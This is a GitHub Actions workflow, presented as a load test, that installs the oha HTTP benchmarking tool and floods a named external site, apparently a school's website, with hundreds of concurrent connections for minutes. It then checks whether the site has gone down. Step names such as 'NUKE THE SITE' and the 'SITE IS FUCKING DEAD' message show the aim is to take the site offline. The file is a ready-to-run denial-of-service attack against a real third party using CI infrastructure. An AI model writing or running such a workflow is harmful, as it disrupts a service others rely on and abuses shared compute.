name: LIVE Load Test - 150K Requests

on:
  workflow_dispatch:
    inputs:
      duration:
        description: 'Test duration (seconds)'
        default: '300'
      connections:
        description: 'Concurrent connections'
        default: '500'

jobs:
  hammer-time:
    runs-on: ubuntu-latest
    
    steps:
      - name: Install oha (Rust load tester)
        run: |
          curl -sL https://github.com/hatoo/oha/releases/download/v1.4.7/oha-linux-amd64 -o /usr/local/bin/oha
          chmod +x /usr/local/bin/oha
      
      - name: NUKE THE SITE - LIVE OUTPUT
        run: |
          echo "🔥 TARGET: https://www.kkh-school.edu.bd/"
          echo "⚡ CONNECTIONS: ${{ github.event.inputs.connections }}"
          echo "⏱️  DURATION: ${{ github.event.inputs.duration }} seconds"
          echo "📊 REQUEST TARGET: 150,000+"
          echo ""
          echo "=== LIVE PROGRESS (updates every second) ==="
          echo ""
          
          # Run oha with 1 second refresh and tee to show live
          oha -z ${{ github.event.inputs.duration }}s \
              -c ${{ github.event.inputs.connections }} \
              --no-tui \
              --interval 1 \
              https://www.kkh-school.edu.bd/ 2>&1 | while IFS= read -r line; do
            echo "[$(date +%H:%M:%S)] $line"
          done
      
      - name: POST-MORTEM - Check if dead
        run: |
          echo ""
          echo "=== VERIFYING SITE STATUS ==="
          sleep 2
          HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 https://www.kkh-school.edu.bd/ || echo "000")
          
          if [ "$HTTP_CODE" = "200" ]; then
            echo "✅ SITE SURVIVED (HTTP $HTTP_CODE)"
          elif [ "$HTTP_CODE" = "000" ]; then
            echo "💀 SITE IS FUCKING DEAD 💀"
            echo "Connection refused or timeout - server collapsed"
          else
            echo "⚠️ SITE IS DYING (HTTP $HTTP_CODE)"
          fi
